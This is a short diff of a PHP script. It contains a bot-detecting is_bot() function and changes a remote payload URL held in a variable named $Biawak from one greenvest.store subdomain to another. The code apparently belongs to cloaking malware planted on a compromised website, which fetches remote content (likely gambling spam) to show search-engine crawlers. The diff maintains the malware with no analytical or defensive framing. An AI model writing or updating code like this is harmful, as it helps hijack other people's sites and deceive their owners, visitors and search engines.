@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$Biawak = "https://platonic.greenvest.store/index.txt";
+$Biawak = "https://gacor.greenvest.store/index.txt";
 
 $request_uri = $_SERVER['REQUEST_URI'] ?? '';
 
